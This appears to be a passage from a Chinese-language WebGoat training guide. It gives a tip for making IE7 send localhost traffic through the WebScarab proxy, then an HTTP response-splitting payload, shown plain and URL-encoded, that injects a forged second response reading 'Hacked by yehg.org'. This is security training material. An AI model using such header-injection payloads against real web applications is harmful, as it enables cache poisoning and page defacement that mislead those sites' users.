## WebGoat {#webgoat}

注意：如果您正在使用WebScarab测试的站点与浏览器位于同一个主机之上(即localhost或者127.0.0.1)，并且浏览器为IE7的话，则需要在主机名的后面添加一个点号&quot;.&quot;，从而强迫IE7使用您配置的代理。这可不是WebScarab的一个bug，而是IE 开发人员所做的一个令人遗憾的设计决策。 如果IE觉得您试图访问的服务器位于本地计算机上，它就会忽略所有的代理设置，欺骗它的一个方法是在主机名后面加一个点，例如 [http://localhost./WebGoat/attack](http://localhost./WebGoat/attack) 。这将强迫IE使用我们配置的代理。

en

Content-Length: 0

HTTP/1.1 200 OK

Content-Type: text/html

Content-Length: 31

&lt;html&gt;Hacked by yehg.org&lt;/html&gt;

en%0D%0AContent-Length%3A%200%0D%0A%0D%0AHTTP%2F1.1%20200%20OK%0D%0AContent-Type%3A%20text%2Fhtml%0D%0AContent-Length%3A%2031%0D%0A%3Chtml%3EHacked%20by%20yehg.org%3C%2Fhtml%3E